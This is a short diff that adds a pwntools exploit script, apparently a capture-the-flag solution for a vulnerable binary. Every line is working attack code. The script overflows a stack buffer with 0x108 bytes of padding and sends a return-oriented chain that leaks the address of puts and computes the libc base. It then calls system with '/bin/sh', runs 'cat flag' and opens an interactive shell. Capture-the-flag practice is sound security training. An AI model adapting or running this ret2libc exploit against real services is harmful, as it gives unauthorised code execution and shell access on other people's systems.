@@ -1,0 +1,22 @@
+r.recv(timeout=1)
+rdi=0x400863
+rdx=next(libc.search(asm('pop rdx;ret')))
+pop_rsi_r15_ret=0x400861
+ret=0x400294
+Hierarchical=0x4006f7
+r.recv(timeout=1)
+r.sendline(b'HRPSS')
+r.recv(timeout=1)
+r.sendline(b'0')
+puts_got=elf.got['puts']
+puts_plt=elf.plt['puts']
+payload=b'a'*0x108+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(Hierarchical)
+r.send(payload)
+leak=u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
+base=leak-libc.sym['puts']
+sh=base+next(libc.search(b'/bin/sh'))
+system=base+libc.sym['system']
+payload2=b'a'*0x108+p64(rdi)+p64(sh)+p64(ret)+p64(system)+p64(Hierarchical)
+r.send(payload2)
+r.sendline('cat flag')
+r.interactive()
